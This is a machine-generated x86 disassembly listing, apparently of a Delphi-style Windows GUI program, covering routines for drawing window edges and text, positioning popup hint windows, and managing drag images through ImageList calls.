cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_429004
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_4296fc
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_440328
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4068a0
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_438584
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_43cb14
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_439bf4
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_43adb8
sub_440394
push ebx
push esi
mov esi edx
call sub_44f7bc
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406830
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_439bf4
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406830
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_439bf4
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_4403f8
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_43cedc
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_440430
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_440428
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_440470
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_437b40
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb00
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_43761c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_4404cc
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_437c18
test bl bl
jle r-xdata
xor eax eax
call sub_435c10
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_44050c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d0c4
xor eax eax
push ebp
push sub_4405a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d4b8
xor eax eax
push ebp
push sub_440584
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44058b
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_41d4b8
retn
sub_4405b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440eac
mov edx 0x80ffff
mov eax esi
call sub_438be0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_41d358
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41cacc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_440624
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43c0b4
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40bab4
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_43c04c
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_440690
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4406e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4406ed
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call ReleaseDC
retn
sub_4406f4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44078d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41c1e4
mov eax ebx
call sub_43ad60
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_438a40
mov eax [ ebp - 0x14 ]
call sub_404450
push eax
mov eax [ ebx + 0x208 ]
call sub_41d438
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440794
lea eax [ ebp - 0x14 ]
call sub_403f90
retn
sub_44079c
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_440808
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_440893
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44089a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_438a40
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_41d298
mov edx eax
add edx 0x6
mov eax esi
call sub_4381fc
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_438a40
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_41d2b4
mov edx eax
add edx 0x4
mov eax esi
call sub_438220
sub_4408a0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_440a79
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_438a70
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_439c98
mov eax [ esi ]
call sub_455ff4
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_456000
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_455ff4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_455fe8
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_456000
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_455fdc
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_455fe8
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_455fdc
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_43c95c
push 0x4
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440a80
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_404250
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_443af4
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call [ rw-data ]
sub_440a88
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_440ab0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_412378
mov eax esi
call sub_43ad60
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_404450
push eax
mov eax [ esi + 0x208 ]
call sub_41d438
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_440b0c
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_412378
call sub_429004
call sub_4290e4
test al al
jne r-xdata
call sub_429004
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_429370
push esp
push 0x1
push 0xf
push 0x0
call sub_429004
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_429154
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_440b78
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_43d264
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_440b9c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_440bdc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_440c9c
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4564c8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42223c
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4564c8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42223c
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_440ca8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_445b3c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_445c78
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_440d08
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_445b3c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_440bdc
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_440d68
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_440ca8
push 0x0
call ShowCursor
sub_440d68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_445b3c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_440dcc
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_440b9c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_440dcc
push ebx
mov ebx eax
mov eax ebx
call sub_445b3c
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_440df0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_445b3c
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_440b9c
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_440e64
push ebx
push esi
mov esi eax
mov eax esi
call sub_445b3c
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_440dcc
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_440cf0
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_440eac
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43af54
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb00
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43761c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_440f08
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43b078
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_440f58
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d0c4
xor eax eax
push ebp
push sub_440ff6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_41d4b8
xor eax eax
push ebp
push sub_440fd3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_437634
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440fda
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41d4b8
retn
sub_441008
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44109c
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_441024
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44109c
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_441694
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_44109c
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_4410d0
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_441160
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
mov edx 0x2
call sub_441160
jmp r-xdata
retn
sub_441118
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_4411cc
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
mov edx 0x2
call sub_4411cc
jmp r-xdata
retn
sub_441160
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_441594
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_4411cc
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_441080
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_441594
push eax
mov eax esi
call sub_4410d0
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_441594
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_44127c
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_441080
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_441694
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_4411cc
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_441080
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_4411cc
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_4410d0
mov edx eax
add edx esi
mov eax ebx
call sub_4415bc
mov edx edi
mov eax ebx
call sub_4415bc
jmp r-xdata
mov eax ebx
call sub_44141c
mov eax ebx
call sub_44166c
mov ebx eax
test ebx ebx
jne r-xdata
sub_441324
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403f90
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403fe4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
sub_441368
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403454
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_4413d9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_439740
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_4413ec
